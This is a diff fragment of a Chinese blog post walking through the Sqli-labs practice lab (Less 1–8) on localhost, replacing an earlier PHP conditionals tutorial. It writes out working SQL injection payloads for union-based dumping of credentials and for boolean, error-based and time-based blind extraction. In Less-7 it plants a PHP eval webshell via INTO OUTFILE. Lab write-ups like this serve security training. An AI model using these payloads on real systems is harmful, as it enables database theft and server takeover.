+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos; --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-11.png" alt="1-11"></p>
+<p>爆users表的所有列名（第三层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-12.png" alt="1-12"></p>
+<p>爆具体数据（第四层）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,username,password from users where id=1--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,username,password from users where id=1--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-13.png" alt="1-13"></p>
 <hr>
-<h4 id="三、if…elseif…else"><a href="#三、if…elseif…else" class="headerlink" title="三、if…elseif…else"></a>三、if…elseif…else</h4><h4 id="3-1-输入代码"><a href="#3-1-输入代码" class="headerlink" title="3.1 输入代码"></a>3.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Student($name,$achievement)&#123;</span><br><span class="line">    if(achievement &gt;= 90)&#123;</span><br><span class="line">        echo $name.&quot;成绩为A&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;elseif(achievement &gt;= 80)&#123;</span><br><span class="line">        echo $name.&quot;成绩为B&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;elseif(achievement &gt;= 70)&#123;</span><br><span class="line">        echo $name.&quot;成绩为C&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $name.&quot;成绩为D&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Student(&quot;小明&quot;,80);</span><br><span class="line">Student(&quot;小磊&quot;,90);</span><br><span class="line">Student(&quot;小红&quot;,66);</span><br><span class="line">Student(&quot;小刚&quot;,76);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="3-2-查看结果"><a href="#3-2-查看结果" class="headerlink" title="3.2 查看结果"></a>3.2 查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9D%A1%E4%BB%B6%E7%BB%93%E6%9E%84/3-2.png" alt="3-2"></p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less - 2"></a>Less - 2</h2><p>同样的构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-1.png" alt="2-1"></p>
+<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，查询代码使用了整数</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=1&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>所以这关就不需要对<strong>单引号</strong>的问题进行处理，直接尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-2.png" alt="2-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-3.png" alt="2-3"></p>
 <hr>
-<h3 id="四、Switch"><a href="#四、Switch" class="headerlink" title="四、Switch"></a>四、Switch</h3><h4 id="4-1-输入代码"><a href="#4-1-输入代码" class="headerlink" title="4.1 输入代码"></a>4.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Student($name,$favcolor)&#123;</span><br><span class="line">    switch($favcolor)&#123;</span><br><span class="line">        case &quot;red&quot;:</span><br><span class="line">        echo $name.&quot;最喜欢的颜色是红色！&lt;/br&gt;&quot;;</span><br><span class="line">        break;</span><br><span class="line">        case &quot;blue&quot;:</span><br><span class="line">        echo $name.&quot;最喜欢的颜色是蓝色！&lt;/br&gt;&quot;;</span><br><span class="line">        break;</span><br><span class="line">        case &quot;green&quot;:</span><br><span class="line">        echo $name.&quot;最喜欢的颜色是绿色！&lt;/br&gt;&quot;;</span><br><span class="line">        break;</span><br><span class="line">        default:</span><br><span class="line">        echo $name.&quot;最喜欢的颜色不是红色，绿色也不是蓝色！&lt;/br&gt;&quot;;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student(&quot;小明&quot;,&quot;red&quot;);</span><br><span class="line">Student(&quot;小磊&quot;,&quot;blue&quot;);</span><br><span class="line">Student(&quot;小红&quot;,&quot;yellow&quot;);</span><br><span class="line">Student(&quot;小刚&quot;,&quot;green&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="4-2-查看返回结果"><a href="#4-2-查看返回结果" class="headerlink" title="4.2 查看返回结果"></a>4.2 查看返回结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9D%A1%E4%BB%B6%E7%BB%93%E6%9E%84/4-2.png" alt="4-2"></p>
-
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less - 3"></a>Less - 3</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-1.png" alt="3-1"></p>
+<p>因此我们得出的结果是，查询代码使用了 <strong>(‘id’)</strong> 对参数进行了处理</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;1&apos;&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>所以这关就需要通过处理掉这个<strong>(‘$id’)</strong>，尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=-1&apos;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-2.png" alt="3-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-3.png" alt="3-3"></p>
+<hr>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less - 4"></a>Less - 4</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。发现没有返回报错信息，并尝试<strong>两个单引号</strong>，也是如此.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-1.png" alt="4-1"></p>
+<p>知道将<strong>单引号</strong>改成<strong>双引号</strong>报错信息才出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-2.png" alt="4-2"></p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>双引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>尝试进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-3.png" alt="4-3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-4.png" alt="4-4"></p>
+<hr>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less - 5"></a>Less - 5</h2><p>这关开始，后面的几关开始接触到盲注了。关于盲注的知识可以看这篇博客的Tip 2部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
+<p>老规矩，构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-1.png" alt="5-1"></p>
+<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。</p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>（1）布尔注入</p>
+<p>使用<strong>length()函数</strong>猜测数据库的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=7 --+</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-3.png" alt="5-3"></p>
+<p>使用<strong>substr()函数</strong>猜测数据库的名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;a&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;a&apos;</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;s&apos;</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;s&apos;</span><br><span class="line"></span><br><span class="line">同样，改变substr()函数里的参数，就可以截取想要猜测的字符，就这样一个个字符爆出来</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,5)=&apos;secur&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,8)=&apos;security&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),3,6)=&apos;curity&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-4.png" alt="5-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-5.png" alt="5-5"></p>
+<p>当然也可以使用这种方法来<strong>爆表名、列名、数据</strong>等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;a&apos; --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos; --+</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,6)=&apos;emails&apos; --+</span><br><span class="line">//当猜测出第一个表之后，改成limit 1,1 就可以猜测第二个表。关于limit的用法，不懂的话记得看前面有链接的Tips文章</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-6.png" alt="5-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-7.png" alt="5-7"></p>
+<p>（2）报错注入</p>
+<p>xpath报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">//爆数据库名称</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-8.png" alt="5-8"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">//爆表名称，同样改变limit的变量去看每个表</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-9.png" alt="5-9"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-10.png" alt="5-10"></p>
+<p>（3）延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br><span class="line">//等待了5秒后，返回空白</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,8)=&apos;security&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-11.png" alt="5-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-12.png" alt="5-12"></p>
+<hr>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less - 6"></a>Less - 6</h2><p>第6关与第5关不同就是对参数ID的处理不同了，变成<strong>一个双引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-1.png" alt="6-1"></p>
+<p>我们使用xpath报错注入试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select username from users where id=2),0x3a)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select password from users where id=2),0x3a)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-3.png" alt="6-3"></p>
+<p>其他的内容和第5关一样，只是<strong>单引号</strong>改成<strong>双引号</strong>，这里就不再赘述了</p>
+<hr>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less - 7"></a>Less - 7</h2><p>这关接触到了<strong>dump into outfile</strong>。关于这部分知识点可以看这篇博客的Tip 3部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
+<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>可以看出来这里对ID的处理是<strong>((‘id’))</strong>，那么我们就可以使用<strong>1’)) or 1=1 –+</strong>进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=1&apos;)) or 1=1--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-1.png" alt="7-1"></p>
+<p>那么我们现在就可以通过<strong>文件导入</strong>的方式写入文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-2.png" alt="7-2"></p>
+<p>可以看到虽然提示语法错误，但是我们这个<strong>HSW.php</strong>文件是已经写入的了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-3.png" alt="7-3"></p>
+<p>可以访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-4.png" alt="7-4"></p>
+<p>既然是可以成功写入的，那么我们就可以把写入的内容换成<strong>一句话木马</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;HSW&quot;])?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW2.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-5.png" alt="7-5"></p>
+<p>注意：</p>
+<ol>
+<li>这里要写入的文件必须是之前没有的，如果我这里还是使用<strong>HSW.php</strong>，那么一句话木马是不会写入的。只有改成不存在的文件名，如<strong>HSW2.php</strong>才行</li>
+<li>我们这里用一句话代替之前3的位置，要加上2个<strong>单引号</strong>把语句括起来</li>
+</ol>
+<p>我们也是可以访问一下这个<strong>HSW2.php</strong>文件，看有没有导入成功。结果看来是有的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-6.png" alt="7-6"></p>
+<p>这是就可以用<strong>蚁剑</strong>或者<strong>菜刀</strong>等等工具去连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-7.png" alt="7-7"></p>
+<hr>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less - 8"></a>Less - 8</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-1.png" alt="8-1"></p>
+<p>此时我们发现和之前不同的是，没有报错信息了！怎么办？根据之前的经验，我们配合<strong>or 1=1 –+</strong> 进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
